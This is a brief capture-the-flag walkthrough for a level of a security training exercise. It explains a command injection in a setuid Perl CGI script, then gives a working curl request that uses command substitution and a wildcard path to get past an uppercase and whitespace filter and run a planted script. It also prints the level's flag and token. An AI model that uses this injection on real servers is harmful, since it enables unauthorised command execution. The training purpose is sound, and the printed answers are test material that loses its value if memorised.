## FLAG: `fa6v5ateaw21peobuub8ipe6s`

## We have a perl script
> ls -l
```
    total 4
    -rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
```

> cat level12.pl
##  `# localhost:4646`                          Script on `localhost:4646`
##  `n(t(param("x"), param("y")));`             Looking for 2 params `x` and `y`
##      `$nn = $_[1];`                          `y` put to `nn`
##      `$xx = $_[0];`                          `x` put to `xx`
##      `$xx =~ tr/a-z/A-Z/;`                   toupper on `xx`
##      `$xx =~ s/\s.*//;`                      replace everything following a whitespace (`\s`) by nothing on `xx`
##  ``@output = `egrep "^$xx" /tmp/xd 2>&1`;``  can exploit with `xx`

## Creating a getflag script
> vi /tmp/12_GETFLAG.SH
```
#!/bin/bash
getflag > /tmp/12_res
```
> chmod +x /tmp/12_GETFLAG.SH

## Calling the perl script with `curl` 
> curl 'http://127.0.0.1:4646/?x=$(/*/12_GETFLAG.SH)&y=BAHRIEN'
> cat /tmp/12_res
```
    Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```